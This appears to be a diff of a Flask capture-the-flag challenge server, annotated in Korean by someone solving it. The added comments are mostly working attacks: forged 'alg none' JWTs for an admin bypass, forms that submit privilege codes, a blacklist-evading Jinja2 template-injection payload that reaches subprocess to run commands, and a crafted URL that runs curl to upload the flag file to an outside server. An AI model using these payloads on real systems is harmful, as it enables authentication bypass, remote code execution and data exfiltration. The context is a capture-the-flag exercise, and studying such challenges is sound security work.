@@ -82,6 +82,8 @@ def logout ():
     resp.set_cookie ('auth', '')
     return resp
 
+# origin : eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoidXNlciIsInVzZXIiOiJnMHBoZXIifQ.DaPxDr78Yw4pjJ5bh03sLC1hf6vbF1J9qc3Vq8A5WA4
+# attack : eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiZzBwaGVyIn0.
 @app.route ('/authorize', methods=['POST'])
 def authorize ():
     token = request.cookies.get ("auth")
@@ -108,6 +110,14 @@ def authorize ():
                 # 아마 위 코드가 실행되면 모두가 같은 데이터를 갖게 될 것.
                 # 산타의 정보도 위 정보로 바뀔것임.
                 # step=1&privilegeCode=g0pher
+'''
+<div>
+    <form action="/authorize?step=1" method="post">
+        <input name="privilegeCode" value="g0pher">
+        <input type="submit">
+    </form>
+</div>
+'''
                 resp = make_response (redirect ("/"))
             elif (step == 2):
                 userpss = adminPrivileges [uid][2]
@@ -119,7 +129,15 @@ def authorize ():
                 if (request.form.get('accessCode') == str (uid) + usr + pss + userpss):
                     authorizedAdmin [userData ["user"]] = True
                     #os.system ("curl https://lapland.htsp.ro/adminauth") # Announce new admin authorization
-
+'''
+<div>
+    <form action="/authorize?step=2" method="post">
+        <input name="accessCode" value="71g0pherg0pherg0pher">
+        <input type="submit">
+    </form>
+</div>
+'''
+ 
                     resp = make_response (redirect ("/"))
                 else:
                     resp = render_template ("error.html", error = "Access Code is incorrect.")
@@ -138,29 +156,30 @@ def makehat ():
     token = request.cookies.get ("auth")
     blacklist = ["config", "self", "request", "[", "]", '"', "_", "+", " ", "join", "%", "%25"]
     if (hatName == None):
-    	return render_template ("error.html", error = "Your hat has no name!")
-
+        return render_template ("error.html", error = "Your hat has no name!")
+ 
     for c in blacklist:
         if (c in hatName):
             return render_template ("error.html", error = "That's a hella weird Hat Name, maggot.")
 
 
-    # authorizedAdmin=dict(g0pher=True)
+    # authorizedAdmin=dict(dlwotmd=True)
     # eval('\x61\x75\x74\x68\x6f\x72\x69\x7a\x65\x64\x41\x64\x6d\x69\x6e\x5b\x27\x67\x30\x70\x68\x65\x72\x27\x5d\x20\x3d\x20\x54\x72\x75\x65')
     # resp=make_response().set_cookie('auth',jwt.encode({'type': 'admin', 'user':'g0pher'}, JWTSecret, algorithm = 'HS256'))
     if (len (hatName.split (",")) > 2):
         return render_template ("error.html", error = "How many commas do you even want to have?")
 
-    page = render_template ("hat.html", hat = random.randint (0, 9), hatName = hatName) # SSTI 삽입
-
+    page = render_template ("hat.html", hat = random.randint (0, 9), hatName = hatName)
+    # attack1 : eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiZzBwaGVyIn0.
+    # attack2 : eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiZzBwaGVyIiwicGFzcyI6IiNnMHBoZXIifQ.
     if (token != None):
         userData = DecodeJWT (token)
         try:
             authorized = False
-            # authorizedAdmin이 true인지는 검사 안하고 리스트에 있는지만 검사함.
+            # authorizedAdmin에 id가 있어야 함.
             if ((userData["user"] in authorizedAdmin) and (users[userData["user"]] == userData["pass"])):
                 authorized = True # and what
-                resp = render_template_string (page) # SSTI 가능!!!
+                resp = render_template_string (page) # SSTI 가능!!!!!!!!!!!!!!
             else:
                 resp = render_template ("error.html", error = "Unauthorized.")
         except:
@@ -172,3 +191,11 @@ def makehat ():
 
 if __name__ == '__main__':
     app.run (host = '0.0.0.0', port = port)
+
+
+# subprocess.Popen('ls')
+# {{({}|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()).pop(215)('ls',stdout=-1).stdout.read()}}
+# b'__pycache__\nconfig.py\nserver.py\nstatic\ntemplates\nunusual_flag.mp4\n'\
+
+# curl로 내 서버에 파일 업로드하여 추출
+# http://challs.xmas.htsp.ro:11005/makehat?hatName={{({}|attr(%27\x5f\x5fclass\x5f\x5f%27)|attr(%27\x5f\x5fbase\x5f\x5f%27)|attr(%27\x5f\x5fsubclasses\x5f\x5f%27)()).pop(215)(%27%27%27curl---F--file=@./unusual\x5fflag.mp4--http://myserver.com/getfile%27%27%27.split(%27--%27),stdout=-1).stdout.read()}}
